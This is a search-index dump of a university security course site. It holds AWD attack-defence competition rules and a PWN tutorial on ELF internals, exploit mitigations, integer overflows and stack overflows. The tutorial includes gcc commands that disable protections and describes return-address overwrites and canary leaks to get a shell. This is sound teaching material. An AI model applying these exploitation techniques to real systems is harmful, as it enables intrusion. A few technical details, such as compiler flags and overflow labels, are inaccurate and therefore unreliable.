<li>\u5728\u8fbe\u523010,000\u5206\u540e\u662f\u5426\u53ef\u4ee5\u7ee7\u7eed\u5f97\u5206\uff1f\u5f53\u7136\u53ef\u4ee5\uff0c\u5c3d\u7ba1\u4e0d\u4f1a\u4ee4\u81ea\u5df1\u961f\u4f0d\u7684\u603b\u8bc4\u5206\u6570\u66f4\u9ad8\uff0c\u4f46\u53ef\u4ee5\u5f97\u5230\u5185\u5fc3\u7684\u5927\u6ee1\u8db3\u3002</li> <li>\u7406\u8bba\u4e0a\u7684\u6700\u9ad8\u5206\uff1a30000\u5206\uff0c\u4ee3\u8868\u53d6\u5f97\u4e86\u5176\u4f597\u652f\u961f\u4f0d\u7684\u5168\u90e8\u53ef\u80fd\u53d6\u5f97\u7684\u5206\u6570\uff0c\u5305\u62ec\u5b95\u673a\u5206\u4e0e\u653b\u51fb\u5206\uff0c\u5e76\u4e14\u672c\u961f\u4f0d\u7684\u670d\u52a1\u5747\u672a\u88ab\u653b\u9677\uff0c\u5c06\u4f1a\u5f97\u5230AWD\u90e8\u5206\u7684\u6700\u9ad8\u5206130\u5206\u3002</li> <li>\u7406\u8bba\u4e0a\u7684\u6700\u4f4e\u5206\uff1a-2000\u5206\uff0c\u4ee3\u8868\u672c\u961f\u4f0d\u7684\u670d\u52a1\u4e0d\u4f46\u672a\u901a\u8fc7\u5b95\u673a\u68c0\u67e5\uff0c\u6bcf\u4e00\u8f6e\u90fd\u88ab\u653b\u9677\uff0c\u5c06\u4e4b\u5f97\u5230AWD\u90e8\u5206\u7684\u6700\u4f4e\u52060\u5206\u3002</li> <li>\u5206\u6570\u4e0e\u6700\u7ec8\u5f97\u5206\u7684\u6620\u5c04\u5173\u7cfb\u4e3a\uff1a</li> </ul> <pre><code>score = min(max(AWD_score*(1+#bonus*0.1)*ratio, 0), score_cap)\n* score: final score of AWD part.\n* score_cap: content value 130.\n* AWD_score: score in the AWD competition.\n* ratio: AWD_score to score ratio, content value 3.25E-2.\n</code></pre> <ul> <li>\u6bd4\u5982\u8bf4\uff0c\u5c0fA\u5728AWD\u7ade\u8d5b\u4e2d\u53d6\u5f97\u4e862626\u5206\u7684\u961f\u4f0d\u6210\u7ee9\uff0c\u5c0f\u7ec4\u6210\u5458\u5171\u8ba1\u5f97\u5230\u4e866\u9898bonus\u7684\u52a0\u6210\uff0c\u4e14\u4ed6\u4eec\u7684\u5bf9\u7269\u5206\u5de5\u7684\u8d21\u732e\u6bd4\u76f8\u540c\uff0c\u5e26\u5165\u516c\u5f0f\u8ba1\u7b97\uff0c<code>score  = min(max(6626\\*1.6\\*0.0325, 0), 130) = min(max(136.552, 0), 130) = 130</code>\uff0c\u4e5f\u5c31\u53ef\u4ee5\u5f97\u5230\u6ee1\u5206\u3002</li> </ul>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_16","title":"\u6bd4\u8d5b\u89c4\u5219","text":"<p>\u6bd4\u8d5b\u7981\u6b62\u7684\u89c4\u5219\uff1a</p> <ul> <li>\u7981\u6b62\u76f4\u63a5\u5bf9\u5e73\u53f0\u8fdb\u884c\u653b\u51fb\uff0c\u4f8b\u5982DDoS\u62d2\u7edd\u670d\u52a1\uff0c\u6216\u4f7f\u5f97\u670d\u52a1\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u7684\u5176\u4ed6\u65b9\u5f0f\u3002</li> <li>\u7981\u6b62\u5206\u4eab\u5176\u4ed6\u961f\u4f0d\u7684flag\uff0c\u6216\u7ea6\u5b9a\u4ea4\u6362\u5f7c\u6b64\u7684flag\uff0c\u7b49\u53d6\u5f97\u4e0d\u516c\u6b63\u4f18\u52bf\u7684\u65b9\u5f0f\u3002</li> <li>\u7981\u6b62\u5bf9\u5176\u4ed6\u9009\u624b\u8fdb\u884c\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff0c\u6216\u5176\u4ed6\u4f7f\u5f97\u5176\u4ed6\u9009\u624b\u65e0\u6cd5\u7ef4\u62a4\u670d\u52a1/\u53c2\u4e0e\u653b\u51fb\u7684\u65b9\u5f0f\u3002</li> <li>\u7981\u6b62\u4e3b\u52a8\u5c06\u81ea\u5df1\u961f\u4f0d\u7684flag\u544a\u77e5\u5176\u4ed6\u961f\u4f0d\uff0c\u6ca1\u6709\u5185\u9b3c\u3002</li> <li>\u7981\u6b62\u731c\u89e3\u5176\u4ed6\u961f\u4f0d\u7684SSH\u5bc6\u7801\uff0c\u5e76\u8bd5\u56fe\u901a\u8fc7\u9ed8\u8ba4\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\u3002</li> <li>\u7981\u6b62\u6cc4\u9732\u6bd4\u8d5b\u9898\u76ee\uff0c\u9080\u8bf7\u5916\u90e8\u6210\u5458\u53c2\u52a0\u6bd4\u8d5b\u3002</li> <li>\u7981\u6b62\u4f7f\u5f97\u5176\u4ed6\u961f\u4f0d\u7684\u670d\u52a1\u5b95\u673a\uff0c\u4f7f\u5176\u65e0\u6cd5\u8fd0\u884c\u3002</li> <li>\u4f46\u662f\u5728\u83b7\u5f97shell\u4e4b\u540e\uff0c\u5bf9\u5176\u4ed6\u961f\u4f0d\u7684\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\u3001\u4ee5\u963b\u6b62\u5176\u4ed6\u961f\u4f0d\u901a\u8fc7\u6b64\u6f0f\u6d1e\u83b7\u53d6flag\u662f\u53ef\u884c\u7684\u3002</li> <li>\u7981\u6b62\u672c\u5730\u63d0\u6743\u6216\u4f7f\u7528\u5176\u4ed6\u65b9\u6cd5\u83b7\u53d6root\u6743\u9650\uff0c\u7981\u6b62\u4fee\u6539\u81ea\u5df1\u7684flag.txt\u6587\u4ef6\u5185\u5bb9\u6216\u6743\u9650\u3002</li> <li>\u540c\u6837\u4e0d\u8bb8docker\u9003\u9038\u6216\u5bb9\u5668\u7a7f\u900f\uff0c\u8bf7\u4fdd\u6301AWD\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7ed9\u5b9a\u7684\u7528\u6237\u8d26\u53f7\u3002</li> </ul> <p>\u6bd4\u8d5b\u5141\u8bb8\u7684\u89c4\u5219\uff1a</p> <ul> <li>\u5411\u5df2\u53d6\u5f97shell\u7684\u9776\u673a\u5199\u5165\u4e0d\u6b7b\u9a6c\uff0c\u6216\u5176\u4ed6\u83b7\u5f97\u540e\u95e8\u7684\u7a0b\u5e8f\u3002</li> <li>\u901a\u8fc7\u5185\u7f51\u55c5\u63a2\u8fdb\u884c\u6d41\u91cf\u5206\u6790\uff0c\u5bf9payload\u8fdb\u884c\u9006\u5411\u4ee5\u53d6\u5f97\u601d\u8def\u3002</li> <li>\u4e3a\u81ea\u5df1\u7684\u670d\u52a1\u90e8\u7f72\u901a\u9632\u6216\u9632\u706b\u5899\uff0c\u62e6\u622a\u6076\u610f\u8bf7\u6c42\uff0c\u5e76\u653e\u884c\u68c0\u6d4b\u670d\u52a1\u7684\u6570\u636e\u3002</li> <li>\u4f7f\u7528\u7269\u7406\u653b\u51fb\uff0c\u901a\u8fc7badUSB\u83b7\u5f97\u5176\u4ed6\u961f\u4f0d\u653b\u51fb\u673a\u7684\u6743\u9650\u3002</li> </ul> <p>\u5982\u679c\u9047\u5230\u4e86\u96be\u4ee5\u754c\u5b9a\u5408\u6cd5\u6027\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u6bd4\u8d5b\u65f6\u63d0\u51fa\u610f\u89c1\u3002</p> <p>\u5bf9\u6bd4\u8d5b\u89c4\u5219\u7684\u8fdd\u53cd\u5c06\u4f1a\u5bfc\u81f4\u6210\u7ee9\u4f5c\u5e9f\uff0c\u4e25\u91cd\u60c5\u51b5\u4e0b\u53ef\u80fd\u5bfc\u81f4\u6bd4\u8d5b\u91cd\u65b0\u5f00\u5c55\uff0c\u5e76\u4e14\u5c06\u4f1a\u8bb0\u5f55\u8fdb\u5165\u6284\u88ad\u6863\u6848\uff0c\u60c5\u8282\u7279\u522b\u4e25\u91cd\u7684\uff0c\u5c06\u5bfc\u81f4\u672c\u95e8\u8bfe\u7a0b0\u5206\uff0c\u4e14\u5c06\u4f1a\u603b\u7ed3\u4e3a\u6587\u6863\u53d1\u5e03\u7ed9\u8ba1\u7b97\u673a\u7cfb/\u56fe\u7075\u9662\u3002\u5e0c\u671b\u5927\u5bb6\u4e50\u5728\u53c2\u4e0e\uff0c\u8bf7\u52ff\u8003\u8651\u6b6a\u95e8\u90aa\u9053\u3002</p> <p>\u5982\u679c\u5bf9\u4e8e\u6bd4\u8d5b\u4e8b\u9879\u4ecd\u7136\u6709\u7591\u95ee\uff0c\u53ef\u4ee5\u4e0eTA\uff08\u674e\u7167\uff09\u8fdb\u884c\u8ba8\u8bba\u3002</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/","title":"Lab 2: Secure Coding and Buffer Overflows","text":"<p>Students may be confused about the term \"PWN\". Because \"PWN\" does not mean something specific like Web or CRYPTO. In fact, \"PWN\" is an onomatopoeic word that represents the \"bang\" sound of a hacker gaining access to a computer through a vulnerability attack, and there is also a theory that \"PWN\" comes from the word \"own\" that controls a computer. There is also a theory that \"PWN\" comes from the word \"own\" which controls the computer. In short, the method or process of gaining access to a computer through a binary vulnerability is known as PWN.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#pwn-basics","title":"PWN Basics","text":""},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#what-is-pwn","title":"What is PWN","text":"<p>In CTF, PWN is mainly used to obtain flags by exploiting vulnerabilities in a program to cause memory corruption in order to obtain the shell of a remote computer. a more common form of PWN topic is to put an executable program written in C/C++ running on a target server, and the participant interacts with the server with data through the network. Because of the general vulnerability in the topic, an attacker can construct a program that sends malicious data to the remote server, causing the remote server program to execute the code the attacker wishes, thus taking control of the remote server.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#how-to-learn-pwn","title":"How to learn PWN","text":"<p>Reverse engineering is the basis of PWN, and the knowledge structure of both is similar. Therefore, sometimes binary security is used to refer to both reverse engineering and PWN. the threshold of entry to binary security is relatively high, requiring participants to study and accumulate for a long period of time and have a certain knowledge base before they can get started. This leads many beginners to give up before getting started. To get started in PWN, a certain foundation in reverse engineering is essential, which in turn leads to a further scarcity of PWN participants.</p> <p>The purpose of this chapter is to lead the student to get started, so it will focus on PWN vulnerability exploitation techniques. The part about the basics cannot be introduced in detail due to the limitation of space. If the student does not understand the process of learning, you can spend some time to understand the basics, and then go back to consider how to solve, it may be clear.</p> <p>The core knowledge of binary security consists of four main categories.</p> <p>1. Programming language and compilation principle</p> <p>Usually, the PWN topics in CTF will be written in C/C++ language. In order to write attack scripts, learning a scripting language like Python is also a must. In addition, the possibility of writing PWN questions in languages other than C/C++, such as Java or Lua, cannot be ruled out. Therefore, it is necessary for the participants to have a wide exposure to some mainstream languages. For reverse engineering, how to decompile better and faster is a challenge. Whether it is manual disassembly or writing automated code analysis and vulnerability mining tools, knowledge of compilation principles is very beneficial.</p> <p>2. Assembly Language</p> <p>Assembly language, the core of reverse engineering, is also the first hurdle that PWN beginners have to face. If you get involved in the field of binary, assembly language is not bypassed. Only by understanding how the CPU works from the bottom can you understand why, through program vulnerabilities, an attacker can make the program execute the code set.</p> <p>3. Operating system and computer architecture</p> <p>The operating system, the core software running on the computer, is often the target of attackers PWN. To understand exactly how a program is executed and how it performs a variety of tasks, participants must learn about operating systems and computer architecture. In the CTF, many exploits and techniques also require the use of some features of the operating system to reach. Also, knowledge of operating systems is necessary to reverse and understand a program.</p> <p>4. Data structures and algorithms</p> <p>Programming is always about data structures and algorithms. If you want to understand the logic of program execution, it is necessary to understand the algorithms and data structures used.</p> <p>The above is not so much the core of binary security as it is the core knowledge of computer science. If we compare various vulnerability techniques to various moves in martial arts novels, this knowledge is the \"internal\" martial arts. Moves are easy to learn and limited, but the road to improve their \"internal\" is endless. The important thing to improve their own binary level is not to learn a variety of fancy use of skills, but to spend time to learn the basics.</p> <p>Unfortunately, some programmers and information security practitioners are often in a hurry to learn all kinds of vulnerability exploitation techniques. These core elements of computer science are not studied seriously instead. Students who sincerely hope to achieve good results in the CTF, and in the real reality of vulnerability mining, these basic content is often more important than a variety of exploitation techniques. Do not fall into the trap of only learning various PWN techniques by \"building a platform out of sand\".</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#linux-basics","title":"Linux Basics","text":"<p>Most of the PWN topics in the current CTF use the Linux platform, so it is necessary to master the relevant Linux basics. The following is an introduction to the content of Linux that is closely related to PWN utilization.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#system-and-function-calls-in-linux","title":"System and function calls in Linux","text":"<p>Like 32-bit Windows programs, 32-bit Linux programs follow the principle of stack balancing during operation, with ESP and EBP as stack pointer and frame pointer registers and EAX as return value. Based on the source code and compiled results (see Figure 6-1-1), it can be seen that the argument passing follows the traditional <code>cdecl</code> calling convention, i.e., function arguments are put on the stack from right to left, and the function arguments are cleared by the caller.</p> <p></p> <p>64-bit Linux programs, on the other hand, use the <code>fast call</code> calling method for passing parameters. The main difference between the 64-bit version compiled from the same source code and 32-bit is that the first six parameters of the function are passed in order using the RDI, RSI, RDX, RCX, R8, R9 registers, and if there are extra parameters, then the same stack is used for passing as in 32-bit, see Figure 6-1-2.</p> <p></p> <p>The PWN process also often requires direct calls to API functions provided by the operating system. Unlike in Windows, where the system API is called using the \"win32 api\" function, Linux is also characterized by its concise system calls.</p> <p>In the 32-bit Linux operating system, the system call requires the execution of the <code>int 0x80</code> soft interrupt instruction. At this point, <code>eax</code> stores the system call number, and the parameters of the system call are stored in EBX, ECX, EDX, ESI, EDI, EBP registers in turn. The return result of the call is stored in EAX. In fact, the system call can be regarded as a special function call, but using the <code>int 0x80</code> instruction instead of the call instruction. the function address in the call instruction becomes the system call number stored in EAX, and the parameters are passed using registers instead. Compared to the 32-bit system, the 64-bit Linux system call instruction becomes syscall, the registers for passing parameters become RDI, RSI, RDX, R10, R8, R9, and the system call corresponding to the system call number is changed. An example for the read system call is shown in Figure 6-1-3.</p> <p></p> <p>There are only 300+ system calls available for the Linux operating system, and the number may increase in the future with the kernel version update, but it is quite streamlined compared to Windows' hefty API. As for the call number and the parameters that should be passed to each system call, the reader can consult the Linux help manual.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#elf-file-structure","title":"ELF file structure","text":"<p>The executable file format under Linux is ELF (Executable and Linkable Format), similar to the PE format of Windows. The ELF header includes the ELF magic code, the computer architecture in which the program is running, the program entry, etc. It can be read by the \"readelf-h\" command and is generally used to find the entry point of some programs. The ELF file consists of several sections (sections), in which various data are stored. The sections in ELF are used to store a variety of data, including: </p> <p>\u2756 .text section - holds all the code needed to run a program. </p> <p>\u2756 .rdata section - holds unmodifiable static data used by the program, such as strings. </p> <p>\u2756 .data section - holds data that can be modified by a program, such as global variables that have been initialized in C, etc. </p> <p>\u2756 .bss section - used to store program modifiable data, which, unlike .data, is not initialized and therefore does not occupy ELF space. Although the .bss section exists in the section header table, there is no corresponding data in the file. The system does not request an empty block of memory for the actual .bss section until after the program starts execution. </p> <p>\u2756 The .plt section and the .got section - these two sections are needed in conjunction with the program to call functions in the dynamic link library (SO file) to get the address of the called function.</p> <p>Due to the extensibility of the ELF format, it is even possible to create custom sections when compiling a linked program.ELF can actually include a lot of content unrelated to program execution, such as program version, Hash, or some symbolic debugging information. However, the operating system does not parse the information in ELF when executing an ELF program, but rather the ELF header and Program Head Table. The purpose of parsing the ELF header is to determine the instruction set architecture, ABI version, and other system support information of the program, and to read the program entry. Then, Linux parses the Program Head Table to determine which program segments need to be loaded. The program header table is actually an array of Program Head structures, each of which contains information about the segment's description. Like Windows, Linux also has a memory mapping file feature. When executing a program, the operating system needs to load the specified contents of the ELF file into the specified location in memory according to the segment information specified in the program header table. Therefore, the content of each program header mainly includes the segment type, its address in the ELF file, which address to load into memory, segment length, memory read/write attributes, etc.</p> <p>For example, the memory read/write attribute of the segment that holds code in ELF is readable and executable, while the segment that holds data is readable and writable or read-only, etc. Note that some segments may not have corresponding data content in the ELF file, such as uninitialized static memory. In order to compress the ELF file, only one field will exist in the program header table, and the operating system will perform the memory request and zero setting operations. The operating system also does not care about the exact contents in each segment, but simply loads each segment as required and points the PC pointer to the program entry.</p> <p>Here some people may be confused about the relationship between sections and segments and their difference, but in fact both are just two forms of explaining the data in ELF. Just like a person has multiple identities, ELF uses both segment and section formats to describe a piece of data, only with a different focus. The operating system doesn't need to care about the specific function of the data in ELF, it just needs to know which piece of data should be loaded into which piece of memory and the read/write properties of the memory, so it will divide the data according to segments.</p> <p>A compiler, debugger, or IDA needs to know what the data represents, so it parses the data by sections. Usually, sections are more subdivided than segments, e.g. .text, rdata are often divided into a segment. Some sections that are purely used to describe additional information about the program and have nothing to do with program operation will not even have a corresponding segment and will not be loaded into memory during program operation.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#vulnerability-mitigation-measures-under-linux","title":"Vulnerability Mitigation Measures under Linux","text":"<p>Modern operating systems use a number of means to mitigate the risk of a computer being attacked by a vulnerability, which are collectively referred to as vulnerability mitigation measures.</p> <p>1. NX</p> <p>NX protection, also known as DEP in Windows, is the setting of permissions on program memory at the granularity of pages through the Memory Protect Unit (MPU) mechanism of modern operating systems, with the basic rule that writable and executable permissions are mutually exclusive. Therefore, it is not possible to execute arbitrary code directly using shellcode in a program with NX protection enabled. All memory that can be modified to write shellcode is not executable, and all code data that can be executed is not modifiable.</p> <p>NX protection is enabled by default in GCC and can be turned off by adding the \"-z execstack\" parameter at compile time.</p> <p>2. Stack Canary</p> <p>Stack Canary protection is a protection mechanism designed specifically for stack overflow attacks. Since the main goal of stack overflow attack is to overwrite the return address of the high bit of the function stack by overflow, the idea is to write a word-length random data before the function starts execution, that is, before the return address, and check whether the value is changed before the function returns, if it is changed, it is considered that a stack overflow has occurred. The program will terminate directly.</p> <p>GCC uses Stack Canary protection by default, and the way to turn it off is to add the \"-fno-stack-protector\" parameter at compile time.</p> <p>3. ASLR (Address Space Layout Randomization)</p> <p>The purpose of ASLR is to randomize the stack address of the program and the load address of the dynamic link library, which are not read/write executable unmapped memory between these addresses to reduce the attacker's knowledge of the program memory structure. In this way, even if the attacker has laid out the shellcode and can control the jump, it still cannot execute the shellcode because the memory address structure is unknown.</p> <p>ASLR is a system-level protection mechanism, and is turned off by modifying the contents of the /proc/sys/kernel/randomize_va_space file to 0.</p> <p>4. PIE</p> <p>Very similar to ASLR protection, the purpose of PIE protection is to allow randomized loading of the address of the executable ELF, thus making the memory structure of the program completely unknown to the attacker and further improving the security of the program.</p> <p>GCC is compiled with PIE enabled by adding the parameter \"-fpic-pie\". Newer versions of GCC have PIE enabled by default, and can be turned off by setting \"-no-pie\".</p> <p>5. Full Relro</p> <p>Full Relro protection is related to the Lazy Binding mechanism under Linux, and its main function is to prohibit the reading and writing of the .GOT.PLT table and some other related memory, thus preventing attackers from writing to the .GOT.PLT table to carry out attack exploitation means.</p> <p>GCC enables Full Relro by adding the parameter \"-z relro\".</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#role-of-got-and-plt","title":"Role of GOT and PLT","text":"<p>.GOT.PLT and .PLT are two special sections that are usually present in ELF files. ELF compilation cannot know the load address of dynamic link libraries such as libc. If a program wants to call a function in a dynamically linked library, it must use .GOT.PLT and .PLT in conjunction to complete the call.</p> <p>In Figure 6-1-4, call_printf does not jump to the location of the actual _printf function. Because the program does not determine the address of the printf function at compile time, this call instruction actually jumps to the _printf entry in the .PLT table through a relative jump. Figure 6-1-5 shows the .PLT entries corresponding to _printf. All external dynamic link library functions used in ELF will have corresponding .PLT entries.</p> <p></p> <p></p> <p>The .PLT table is also a piece of code that retrieves an address from memory and jumps to it. The address is the actual address of _printf, and the place where the actual address of the _printf function is stored is the .GOT.PLT table in Figure 6-1-6.</p> <p></p> <p>.PLT table is actually an array of function pointers, which holds the addresses of all external functions used in ELF. The initialization of the .GOT.PLT table is done by the operating system.</p> <p>Of course, due to the very special Lazy Binding mechanism of Linux. .GOT.PLT table is initialized during the first call to the function in ELF without Full Rello enabled. That is, a function must have been called before the real address of the function is stored in the .GOT.PLT table. The Lazy Binding mechanism is not discussed here, interested students can check the relevant information by themselves.</p> <p>.GOT.PLT and .PLT are useful for PWN? .PLT can directly call some external function, which will be of great help in the subsequent introduction of stack overflow. Second, since .GOT.PLT usually stores the address of a function in libc, you can get the address of libc by reading .GOT.PLT in the exploit, or control the execution flow of the program by writing . GOT.PLT for vulnerability exploitation is very common in CTF.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#integer-overflow","title":"Integer overflow","text":"<p>Integer overflow is a relatively simple element in PWN, of course, it does not mean that the topic of integer overflow is relatively simple, just that integer overflow itself is not very complex, the situation is less. But integer overflow itself is not exploitable, and needs to be combined with other means to achieve the purpose of exploitation.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#integer-operations","title":"Integer operations","text":"<p>Computers do not store infinitely large integers, and the values represented by integer types in computers are only a subset of natural numbers. For example, in a 32-bit C program, the length of the unsigned int type is 32 bits, and the largest number that can be represented is 0xffffffff. If this number is added by 1, the result 0x100000000 will exceed the range that can be represented by 32 bits, and only the lower 32 bits can be intercepted, and eventually the number will become 0. This is unsigned overflow.</p> <p>There are 4 kinds of overflow cases in computers, taking 32-bit integers as an example.</p> <p>\u2756 Unsigned overflow: The unsigned number 0xffffffff plus 1 becomes 0.</p> <p>\u2756 Unsigned underflow: The unsigned number 0 minus 1 becomes 0xffffffff.</p> <p>\u2756 Signed overflow: The case where the signed positive number 0x7fffffff plus 1 becomes negative 0x80000000, i.e., decimal-2147483648.</p> <p>\u2756 Unsigned underflow: the case where the signed negative number 0x80000000 minus 1 becomes positive 0x7fffffff.</p> <p>In addition to this, direct conversion of signed numbers to unsigned numbers can result in abrupt changes in the size of integers. For example, the binary representation of the signed number -1 and the unsigned number 0xffffffff is the same, and a direct conversion of the two can cause the program to produce unintended effects.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#how-integer-overflows-are-used","title":"How integer overflows are used","text":"<p>Although integer overflows are simple, they are not actually simple to exploit. Unlike memory corruptions such as stack overflows, which can be directly exploited by overwriting memory, integer overflows often require some conversion to overflow. There are two common conversions.</p> <p>1. integer overflow into buffer overflow</p> <p>An integer overflow can mutate a very small number into a very large number. For example, an unsigned underflow can turn a smaller number representing the buffer size into a very large integer by subtraction. This results in a buffer overflow.</p> <p>Another case is to bypass some length checks by entering a negative number. For example, some programs will use signed numbers to represent length. Then a negative number can be used to bypass the length limit check. Most system APIs use unsigned numbers to represent length, so the negative number will become a large positive number and lead to overflow.</p> <p>2. integer overflow to array overrun</p> <p>The idea of array overrun is very simple. In C, the operation of array indexing is achieved by simply adding the array pointer to the index, and does not check the bounds. Therefore, a very large index will access the data after the array, and if the index is negative, then it will also access the memory before the array.</p> <p>Usually, integer overflows to array bounds are more common. In the process of array indexing, the array index is also multiplied by the length of the array element to calculate the actual address of the element. In the case of an array of type int, for example, the array index needs to be multiplied by 4 to calculate the offset. If the bounds check is bypassed by passing in a negative number, then normally only the memory before the array can be accessed. However, since the index is multiplied by 4, it is still possible to index the data after the array or even the entire memory space. For example, to index the contents at 0x1000 bytes after the array, just pass in the negative number -2147482624, which is expressed as 0x80000400 in hexadecimal numbers, and then multiply it by the element length 4, which is 0x00001000 due to the unsigned integer overflow result. as you can see, array overruns are easier to exploit compared to integer overflows to buffer overflows.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#stack-overflow","title":"Stack Overflow","text":"<p>The stack is a simple and classical data structure whose main feature is the use of first-in, last-out (FILO) access to the data on the stack. Generally, the last data placed on the stack is called the top of the stack, and the location where it is stored is called the top of the stack. The operation of storing data on the stack is called push, and the operation of removing data from the top of the stack is called pop. For more details about the stack, please refer to the data structure related materials.</p> <p>Since the sequence of function calls is such that the first function called returns last, the stack is ideal for storing intermediate variables and other temporary data used during the operation of a function.</p> <p>Currently, most major instruction architectures (x86, ARM, MIPS, etc.) support stack operations at the instruction set level and are designed with special registers to hold the top-of-stack addresses. In most cases, putting data on the stack will cause the top of the stack to grow from the high to the low address of memory.</p> <p>1. Stack Overflow Principle</p> <p>Stack overflow is one of the buffer overflows. Local variables of a function are usually stored on the stack. If these buffers overflow, it is a stack overflow. The most classic way to exploit stack overflow is to overwrite the return address of a function in order to hijack the control flow of the program.</p> <p>The x86 architecture typically uses the instruction call to call a function and the instruction ret to return. when the CPU executes the call instruction, it first puts the address of the next instruction of the current call instruction on the stack and then jumps to the called function. When the called function needs to return, it only needs to execute the ret instruction, and the CPU will come out with the address of the top of the stack and assign it to the EIP register. This address, which is used to tell the called function where it should return to the calling function, is called the return address. Ideally, the address taken out is the address deposited by the previous call to call. This allows the program to return to the parent function and continue execution. The compiler will always make sure that even if the child function uses the stack and modifies the top of the stack, it will restore the top of the stack to the state it was in when it first entered the function before the function returns, thus ensuring that the return address fetched will not be incorrect.</p> <p></p> <p>Use the following command to compile the program of Example 6-3-1, turn off address randomization and stack overflow protection.</p> <pre><code>gcc -fno-stack-protector stack.c -o stack -no-pie\n</code></pre> <p>Run the program, debug with IDA, after entering 8 A, exit vuln function, the program executes ret instruction, the stack layout is shown in Figure 6-3-1. At this time, the top of the stack is saved 0x400579 that return address, after executing ret instruction, the program will jump to the location of 0x400579. Note that there is a string of 0x414141414141414141 above the return address, which is the 8 A's just entered. Since the get function does not check the length of the input data, it can increase the input until the return address is covered. From Figure 6-3-1, you can see that the return address is 18 bytes away from the first A. If you input more than 19 bytes, the return address will be overwritten.</p> <p>Analyzing this program with IDA, we can learn that the location of the shell function is 0x400537, and our purpose is to make the program jump to this function so as to execute system (\"/bin/sh\") to get a shell.</p> <p>In order to facilitate the input of some non-visible characters (such as address), here used to answer the PWN topic very useful tool pwntools, code comments will explain some of the commonly used functions, more specific instructions please refer to the official documentation.</p> <p></p> <p>The attack script is as follows.</p> <p></p> <p>Use IDA to attach to the process for trace debugging, just to the location of ret, the return address has been overwritten to 0x400537, continue to run the program will jump to the shell function, so as to obtain the shell (see Figure 6-3-2).</p> <p></p> <p>2. Stack protection technology</p> <p>Stack overflows are very difficult to exploit and very harmful. In order to alleviate the growing security problems caused by stack overflows, compiler developers introduced the Canary mechanism to detect stack overflow attacks.</p> <p>Canary translates to canary in Chinese. The Canary protection mechanism is similar to this, by inserting a random number in front of the stack where rbp is stored, so that if an attacker uses a stack overflow vulnerability to overwrite the return address, it will also overwrite the Canary. The compiler adds a piece of code before the function ret instruction that will check if the value of Canary has been overwritten. If it is rewritten, an exception is thrown directly, interrupting the program and thus preventing the attack from occurring.</p> <p>But this method is not always reliable, as in Example 6-3-2.</p> <p></p> <p>Enable stack protection at compile time.</p> <pre><code>gcc stack2.c -no-pie -fstack-protector-all -o stack2\n</code></pre> <p>When vuln function enters, it will take the value of Canary from fs:28, put it into the location of rbp-8, compare the value of rbp-8 with the value in fs:28 before the function exits, and if it is changed, call __stack_chk_fail function, output error message and exit the program (see Figure 6-3-3 and Figure 6-3-4).</p> <p></p> <p></p> <p>But this program will print the input string before the vuln function returns, which will leak the Canary on the stack and thus bypass the detection. Here you can control the length of the string to just connect to the Canary, which will make the Canary and the string printed together by the puts function. Since the lowest byte of the Canary is 0x00, an extra character needs to be sent to overwrite 0x00 in order to prevent it from being truncated by 0.</p> <p></p> <p>In the next input, the leaked canary can be written to the original address and then continue to overwrite the return address:</p> <p></p> <p>The above example illustrates that even if the compiler has protection enabled, you still need to pay attention to prevent stack overflow when writing the program, otherwise it may be exploited by attackers, which can have serious consequences.</p> <p>3. Dangerous functions where stack overflows often occur</p> <p>By looking for dangerous functions, we can quickly determine if a program may have a stack overflow and where the stack overflow is located. The common dangerous functions are as follows.</p> <p>\u2756 Input: gets(), which reads a line directly up to the newline character '\\n', while '\\n' is converted to '\\x00'; scanf(), which formats a string in which %s does not check the length; vscanf(), as above.</p> <p>\u2756 Output: sprintf(), writes the formatted content to the buffer, but does not check the buffer length.</p> <p>\u2756 String: strcpy(), stops when '\\x00' is encountered, does not check the length, often prone to single-byte write 0 (off by one) overflow; strcat(), same as above.</p> <p>4. Available stack overflow coverage locations</p> <p>There are usually three types of stack overflow override locations available:</p> <p>\u2460 Override the function return address, the previous examples are controlled by overriding the return address program.</p> <p>\u2461 Overwrite the value of the BP register saved on the stack. The function will be called to save the stack site first, and then restore it when it returns, as follows (take x64 program as an example) When called.</p> <p></p> <p>When returning: If the BP value on the stack is overwritten, the BP value of the main caller function will be changed after the function returns, and when the main caller function returns to the line ret, the SP will not point to the original return address location, but the BP location after being modified.</p> <p>\u2462 Depending on the realistic execution, overwriting the content of a specific variable or address may lead to some logic vulnerabilities.</p>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#kfc-crazy-thursday","title":"KFC crazy Thursday","text":"<p>On sale!</p> <p>This challenge must create a dynamic docker and connect via domain or DNS.</p> <ol> <li> <p>Outside university <code>nc 116.7.234.225 port</code></p> </li> <li> <p>inside university <code>nc 10.20.55.12 port</code></p> </li> </ol>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#buffer-overflow-in-heap","title":"Buffer overflow in heap","text":"<p>A heap of the heap.</p> <p>This challenge must create a dynamic docker and connect via domain or DNS.</p> <ol> <li> <p>Outside university 